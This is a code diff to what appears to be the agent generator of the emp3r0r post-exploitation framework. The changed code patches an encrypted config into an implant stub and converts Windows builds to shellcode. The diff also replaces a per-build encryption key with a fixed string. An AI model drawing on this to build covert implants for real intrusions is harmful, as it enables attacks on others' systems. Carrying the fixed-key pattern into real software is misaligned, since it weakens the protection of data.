@@ -91,11 +91,12 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 	}
 
 	// read and encrypt config file
-	encryptedJSONBytes, err := readAndEncryptConfig()
+	config_payload, err := readAndEncryptConfig()
 	if err != nil {
 		logging.Errorf("Failed to encrypt %s: %v", live.EmpConfigFile, err)
 		return
 	}
+	logging.Debugf("Config payload: %d bytes", len(config_payload))
 
 	// read stub file
 	toWrite, err := os.ReadFile(stubFile)
@@ -103,11 +104,7 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 		logging.Errorf("Read stub: %v", err)
 		return
 	}
-	sep := bytes.Repeat(def.OneTimeMagicBytes, 2)
-
 	// payload
-	config_payload := append(sep, encryptedJSONBytes...)
-	config_payload = append(config_payload, sep...)
 	// binary patching, we need to patch the stub file at emp3r0r_def.AgentConfig, which is 4096 bytes long
 	if len(config_payload) < len(def.AgentConfig) {
 		// pad with 0x00
@@ -122,16 +119,6 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 		bytes.Repeat([]byte{0xff}, len(config_payload)),
 		config_payload,
 		1)
-	// verify
-	if !bytes.Contains(toWrite, config_payload) {
-		logging.Warningf("Failed to patch %s with config payload, config data not found, append it to the file instead", stubFile)
-		// append config to the end of the file
-		err = appendConfigToPayload(stubFile, sep, encryptedJSONBytes)
-		if err != nil {
-			logging.Errorf("Failed to append config to payload: %v", err)
-			return
-		}
-	}
 	// write
 	if err = os.WriteFile(outfile, toWrite, 0o755); err != nil {
 		logging.Errorf("Save agent binary %s: %v", outfile, err)
@@ -141,8 +128,6 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 	// done
 	logging.Successf("Generated %s from %s and %s",
 		outfile, stubFile, live.EmpConfigFile)
-	logging.Debugf("OneTimeMagicBytes is %x", def.OneTimeMagicBytes)
-
 	if payload_type == PayloadTypeWindowsExecutable {
 		// generate shellcode for the agent binary
 		donut.DonoutPE2Shellcode(outfile, arch_choice)
@@ -212,7 +197,7 @@ func readAndEncryptConfig() ([]byte, error) {
 	}
 
 	// encrypt
-	encryptedJSONBytes, err := crypto.AES_GCM_Encrypt(def.OneTimeMagicBytes, jsonBytes)
+	encryptedJSONBytes, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), jsonBytes)
 	if err != nil {
 		return nil, fmt.Errorf("failed to encrypt %s: %v", live.EmpConfigFile, err)
 	}
